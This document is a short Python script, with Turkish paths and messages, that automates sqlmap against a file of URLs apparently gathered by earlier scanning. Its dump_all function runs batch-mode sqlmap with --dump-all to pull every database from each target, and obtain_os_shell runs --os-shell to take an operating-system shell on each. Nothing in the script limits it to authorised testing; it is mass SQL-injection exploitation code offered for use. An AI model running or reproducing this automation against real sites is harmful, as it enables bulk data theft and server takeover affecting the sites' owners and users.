import os
import subprocess
import re

def run_sqlmap(url, options):
    try:
        result = subprocess.run(["sqlmap", "-u", url] + options, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            print(f"Error: {result.stderr}")
            return None
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")
        return None

def extract_databases(output):
    databases = []
    lines = output.split("\n")
    for line in lines:
        match = re.search(r"available databases\s*\[(\d+)\]", line)
        if match:
            databases.append(match.group(1))
    return databases

def dump_all():
    current_dir = os.getcwd()
    parent_dir = os.path.dirname(current_dir)
    result_dir = os.path.join(parent_dir, "Hangar", "sqlsonuç")
    os.chdir(result_dir)
    request_file = "sqlsonuç.txt"

    output_dir = os.path.join(parent_dir, "Hangar", "tamamlanmış", "dump")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    with open(request_file, "r") as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        options = ["--batch", "--dump-all", f"--output-dir={output_dir}"]
        sqlmap_output = run_sqlmap(url, options)
        if sqlmap_output:
            print(f"URL: {url}, SQLMap verileri başarıyla çekti")
            # Additional processing can be performed, e.g., processing the retrieved data or saving it to a database.

def obtain_os_shell():
    current_dir = os.getcwd()
    parent_dir = os.path.dirname(current_dir)
    result_dir = os.path.join(parent_dir, "Hangar", "sqlsonuç")
    os.chdir(result_dir)
    request_file = "sqlsonuç.txt"
    
    output_dir = os.path.join(parent_dir, "Hangar", "tamamlanmış", "os_shell")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    with open(request_file, "r") as f:
        urls = f.readlines()
    
    for url in urls:
        url = url.strip()
        options = ["--batch", "--os-shell", f"--output-dir={output_dir}"]
        sqlmap_output = run_sqlmap(url, options)
        if sqlmap_output:
            print(f"URL: {url}, SQLMap OS Shelli başarıyla elde etti")
            # Additional processing can be performed, e.g., running commands in the obtained shell.
